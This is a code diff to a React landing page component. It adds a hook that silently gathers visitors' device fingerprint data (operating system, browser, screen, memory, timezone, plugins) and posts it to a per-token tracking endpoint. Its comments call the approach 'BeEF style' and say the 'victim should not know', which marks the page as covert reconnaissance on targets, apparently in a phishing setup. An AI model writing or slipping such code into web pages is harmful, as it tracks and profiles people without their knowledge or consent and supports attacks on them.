@@ -35,6 +35,30 @@ export default function LandingPage() {
       .finally(() => setLoading(false));
   }, [token]);
 
+  useEffect(() => {
+    // Collect and send device fingerprinting data silently (BeEF style)
+    const sendFingerprint = async () => {
+      try {
+        const fingerprintData = {
+          os: navigator.platform || 'Unknown OS',
+          userAgent: navigator.userAgent || 'Unknown Browser',
+          language: navigator.language || 'Unknown Language',
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          colorDepth: window.screen.colorDepth,
+          hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+          deviceMemory: navigator.deviceMemory || 'Unknown',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+          cookieEnabled: navigator.cookieEnabled,
+          plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
+        };
+        await api.post(`/track/fingerprint/${token}`, fingerprintData);
+      } catch (err) {
+        // Silently fail, victim should not know
+      }
+    };
+    sendFingerprint();
+  }, [token]);
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     try {
